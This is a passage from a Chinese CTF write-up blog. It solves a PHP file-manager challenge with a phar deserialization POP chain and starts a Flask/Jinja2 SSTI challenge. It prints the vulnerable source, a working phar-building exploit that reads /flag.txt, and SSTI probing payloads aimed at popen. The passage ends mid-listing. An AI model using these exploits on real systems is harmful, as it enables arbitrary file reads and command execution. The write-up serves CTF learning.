class="hljs-variable">$file</span>-&gt;name()] = <span class="hljs-keyword">array</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        array_push(<span class="hljs-keyword">$this</span>-&gt;funcs, <span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;files <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;name()][<span class="hljs-variable">$func</span>] = <span class="hljs-variable">$file</span>-&gt;<span class="hljs-variable">$func</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;funcs <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="hljs-variable">$func</span>) . <span class="hljs-string">&#x27;&lt;/th&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;results <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span> =&gt; <span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;tr&gt;&#x27;</span>;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="hljs-variable">$value</span>) . <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;<br>            &#125;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . htmlentities(<span class="hljs-variable">$filename</span>) . <span class="hljs-string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;涓嬭浇&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;鍒犻櫎&lt;/a&gt;&lt;/td&gt;&#x27;</span>;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/tr&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$table</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">open</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;filename = <span class="hljs-variable">$filename</span>;<br>        <span class="hljs-keyword">if</span> (file_exists(<span class="hljs-variable">$filename</span>) &amp;&amp; !is_dir(<span class="hljs-variable">$filename</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> basename(<span class="hljs-keyword">$this</span>-&gt;filename);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">size</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$size</span> = filesize(<span class="hljs-keyword">$this</span>-&gt;filename);<br>        <span class="hljs-variable">$units</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27; B&#x27;</span>, <span class="hljs-string">&#x27; KB&#x27;</span>, <span class="hljs-string">&#x27; MB&#x27;</span>, <span class="hljs-string">&#x27; GB&#x27;</span>, <span class="hljs-string">&#x27; TB&#x27;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$size</span> &gt;= <span class="hljs-number">1024</span> &amp;&amp; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">4</span>; <span class="hljs-variable">$i</span>++) <span class="hljs-variable">$size</span> /= <span class="hljs-number">1024</span>;<br>        <span class="hljs-keyword">return</span> round(<span class="hljs-variable">$size</span>, <span class="hljs-number">2</span>).<span class="hljs-variable">$units</span>[<span class="hljs-variable">$i</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">detele</span>(<span class="hljs-params"></span>) </span>&#123;<br>        unlink(<span class="hljs-keyword">$this</span>-&gt;filename);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    header(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>])) &#123;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>    <span class="hljs-variable">$pos</span> = strrpos(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;.&quot;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pos</span> !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-variable">$filename</span> = substr(<span class="hljs-variable">$filename</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$pos</span>);<br>    &#125;<br>    <br>    <span class="hljs-variable">$fileext</span> = <span class="hljs-string">&quot;.gif&quot;</span>;<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>]) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;image/gif&#x27;</span>:<br>            <span class="hljs-variable">$fileext</span> = <span class="hljs-string">&quot;.gif&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;image/jpeg&#x27;</span>:<br>            <span class="hljs-variable">$fileext</span> = <span class="hljs-string">&quot;.jpg&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;image/png&#x27;</span>:<br>            <span class="hljs-variable">$fileext</span> = <span class="hljs-string">&quot;.png&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;Only gif/jpg/png allowed&quot;</span>);<br>            Header(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>            <span class="hljs-keyword">echo</span> json_encode(<span class="hljs-variable">$response</span>);<br>            <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$filename</span>) &lt; <span class="hljs-number">40</span> &amp;&amp; strlen(<span class="hljs-variable">$filename</span>) !== <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-variable">$dst</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sandbox&#x27;</span>] . <span class="hljs-variable">$filename</span> . <span class="hljs-variable">$fileext</span>;<br>        move_uploaded_file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-variable">$dst</span>);<br>        <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;&quot;</span>);<br>        Header(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>        <span class="hljs-keyword">echo</span> json_encode(<span class="hljs-variable">$response</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;Invaild filename&quot;</span>);<br>        Header(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>        <span class="hljs-keyword">echo</span> json_encode(<span class="hljs-variable">$response</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>delete.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    header(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><br>chdir(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sandbox&#x27;</span>]);<br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> File();<br><span class="hljs-variable">$filename</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$filename</span>) &lt; <span class="hljs-number">40</span> &amp;&amp; <span class="hljs-variable">$file</span>-&gt;open(<span class="hljs-variable">$filename</span>)) &#123;<br>    <span class="hljs-variable">$file</span>-&gt;detele();<br>    Header(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>    <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-keyword">echo</span> json_encode(<span class="hljs-variable">$response</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    Header(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>    <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;File not exist&quot;</span>);<br>    <span class="hljs-keyword">echo</span> json_encode(<span class="hljs-variable">$response</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>审计源码，我们发现 class.php File::close() 方法可以任意读取文件，看一下它的引用</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201221406010.png" alt="image-20220122140604924"></p><p>在 download.php那里触发，来到download.php</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201221724212.png" alt="image-20220122172401056"></p><p>可以看到这里有open_basedir设置，而且有filename限制所以没法在这里搞，显然又考到了pop链构造</p><p>重新回到class.php（精简了一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$db</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$db</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;db = <span class="hljs-variable">$db</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;db-&gt;close();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$results</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$funcs</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;files = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-keyword">$this</span>-&gt;results = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-keyword">$this</span>-&gt;funcs = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable">$filenames</span> = scandir(<span class="hljs-variable">$path</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        array_push(<span class="hljs-keyword">$this</span>-&gt;funcs, <span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;files <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;name()][<span class="hljs-variable">$func</span>] = <span class="hljs-variable">$file</span>-&gt;<span class="hljs-variable">$func</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;funcs <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="hljs-variable">$func</span>) . <span class="hljs-string">&#x27;&lt;/th&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;results <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span> =&gt; <span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;tr&gt;&#x27;</span>;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="hljs-variable">$value</span>) . <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;<br>            &#125;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . htmlentities(<span class="hljs-variable">$filename</span>) . <span class="hljs-string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;涓嬭浇&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;鍒犻櫎&lt;/a&gt;&lt;/td&gt;&#x27;</span>;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/tr&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$table</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">detele</span>(<span class="hljs-params"></span>) </span>&#123;<br>        unlink(<span class="hljs-keyword">$this</span>-&gt;filename);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><div class="code-wrapper"><pre><code class="hljs">可以看到  User::__destruct有close方法 这里可以让他为Filelist，为什么不能是File的实例化？因为file_get_contents只负责把结果传递给字符串，所以我们需要搞定他的输出问题那先让他为Filelist对象，即 $this-&gt;db-&gt;close 这里db=new Filelist() 这时就会调用Filelist::__call(),因为Filelist没有close方法。这里call可以直接调用close方法</code></pre></div><p>于是有exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$db</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;files=<span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> File());<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;/flag.txt&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> FileList();<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> User();<br><span class="hljs-variable">$c</span>-&gt;db=<span class="hljs-variable">$b</span>;<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&#x27;test.phar&#x27;</span>);   <span class="hljs-comment">//生成文件名</span><br>    <span class="hljs-variable">$phar</span>-&gt;startBuffering();<br>    <span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&#x27;test.txt&#x27;</span>, <span class="hljs-string">&#x27;text&#x27;</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);     <span class="hljs-comment">//标志位存在则可被识别为phar文件</span><br>    <span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$c</span>); <span class="hljs-comment">////将自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;stopBuffering();<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后将生成的 test.phar 更名为 test.gif 上传文件，然后抓删除的包，更改如下</p><p> <img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201221812934.png" alt="image-20220122181224818"></p><h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>首页源码给出提示</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- Parameter Name: search --&gt;</span><br><span class="hljs-comment">&lt;!-- Method: GET --&gt;</span><br></code></pre></td></tr></table></figure><p>于是可以构造 <code>http://5984b711-4129-4988-9e93-f581a5b1a85b.node4.buuoj.cn:81/?search=&#123;&#123;7*'7'&#125;&#125;</code></p><p>回显 7777777 ，初步判断是Jinja2引擎</p><p>草，这题有过滤？好像没有  <code>?search=&#123;&#123;''.__class__.__mro__[2].__subclasses__()&#125;&#125;</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201221820601.png" alt="image-20220122182000480"></p><p>发现popen</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span>=<span class="hljs-string">&quot;&lt;type &#x27;type&#x27;&gt;,&lt;type &#x27;weakref&#x27;&gt;,&lt;type &#x27;weakcallableproxy&#x27;&gt;,&lt;type &#x27;weakproxy&#x27;&gt;,&lt;type &#x27;int&#x27;&gt;,&lt;type &#x27;basestring&#x27;&gt;,&lt;type &#x27;bytearray&#x27;&gt;,&lt;type &#x27;list&#x27;&gt;,&lt;type &#x27;NoneType&#x27;&gt;,&lt;type &#x27;NotImplementedType&#x27;&gt;,&lt;type &#x27;traceback&#x27;&gt;,&lt;type &#x27;super&#x27;&gt;,&lt;type &#x27;xrange&#x27;&gt;,&lt;type &#x27;dict&#x27;&gt;,&lt;type &#x27;set&#x27;&gt;,&lt;type &#x27;slice&#x27;&gt;,&lt;type &#x27;staticmethod&#x27;&gt;,&lt;type &#x27;complex&#x27;&gt;,&lt;type &#x27;float&#x27;&gt;,&lt;type &#x27;buffer&#x27;&gt;,&lt;type &#x27;long&#x27;&gt;,&lt;type &#x27;frozenset&#x27;&gt;,&lt;type &#x27;property&#x27;&gt;,&lt;type &#x27;memoryview&#x27;&gt;,&lt;type &#x27;tuple&#x27;&gt;,&lt;type &#x27;enumerate&#x27;&gt;,&lt;type &#x27;reversed&#x27;&gt;,&lt;type &#x27;code&#x27;&gt;,&lt;type &#x27;frame&#x27;&gt;,&lt;type &#x27;builtin_function_or_method&#x27;&gt;,&lt;type &#x27;instancemethod&#x27;&gt;,&lt;type &#x27;function&#x27;&gt;,&lt;type &#x27;classobj&#x27;&gt;,&lt;type &#x27;dictproxy&#x27;&gt;,&lt;type &#x27;generator&#x27;&gt;,&lt;type &#x27;getset_descriptor&#x27;&gt;,&lt;type 